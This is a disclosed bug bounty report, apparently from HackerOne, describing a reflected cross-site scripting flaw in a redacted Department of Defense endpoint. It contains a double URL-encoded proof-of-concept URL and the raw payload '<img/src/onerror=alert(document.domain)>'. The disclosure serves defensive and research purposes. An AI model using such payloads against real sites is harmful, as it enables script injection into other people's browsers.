# Reflected XSS at ████ via ██████████= parameter 

## Report Details
- **Report ID**: 1305472
- **URL**: https://hackerone.com/reports/1305472
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-08-14T16:28:42.570Z
- **Disclosed**: 2021-10-28T20:17:41.215Z

## Reporter
- **Username**: zhenwarx
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi
I found that this endpoint is vulnerable with Reflected XSS, The ███= parameter is vulnerable with RXSS
PoC:
```
██████████?████████=%253Cimg/src/onerror=alert(document.domain)%253E

```
Payload: `<img/src/onerror=alert(document.domain)> `
Regards

## Impact

RXSS

## System Host(s)
www.███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
██████████?█████=%253Cimg/src/onerror=alert(document.domain)%253E

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
